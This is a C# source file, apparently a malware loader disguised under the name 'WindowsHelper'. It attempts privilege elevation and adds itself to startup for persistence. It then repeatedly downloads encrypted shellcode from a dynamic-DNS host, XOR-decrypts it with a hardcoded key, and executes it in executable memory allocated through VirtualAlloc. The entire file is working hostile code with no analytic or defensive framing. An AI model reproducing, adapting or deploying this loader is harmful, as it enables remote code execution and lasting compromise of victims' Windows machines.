using System.Net;
using System.Runtime.InteropServices;

namespace WindowsHelper
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        static void Main()
        {
            string shellcodeUrl = "http://aui.hopto.org:5000/encrypted_shellcode.bin";
            string keyHex = "563c8242";

            CurrentSystem system = new CurrentSystem();
            try
            {
                if (system.IsAdministrator() == false)
                {
                    system.TryAdmin();
                    if (system.hasRan() == false)
                    {
                        system.AddToStartup();
                    }
                }
            }
            catch { }
            bool success = false;
            WebClient client = new WebClient();
            byte[] encryptedShellcode = null;

            Random rand = new Random();
            while (!success)
            {
                try
                {
                    encryptedShellcode = client.DownloadData(shellcodeUrl);
                    success = true;

                }
                catch (Exception ex)
                {
                    Console.WriteLine("Could not download: " + ex.Message);
                    int delay = rand.Next(7000, 11000);
                    System.Threading.Thread.Sleep(delay);

                }
            }

            byte[] key = new byte[keyHex.Length / 2];
            for (int i = 0; i < key.Length; i++)
            {
                key[i] = Convert.ToByte(keyHex.Substring(i * 2, 2), 16);
            }
            byte[] shellcode = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
                shellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);
            }
            IntPtr shellcodeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
            Action shellcodeFunc = (Action)Marshal.GetDelegateForFunctionPointer(shellcodeAddr, typeof(Action));
            shellcodeFunc();
        }
    }

}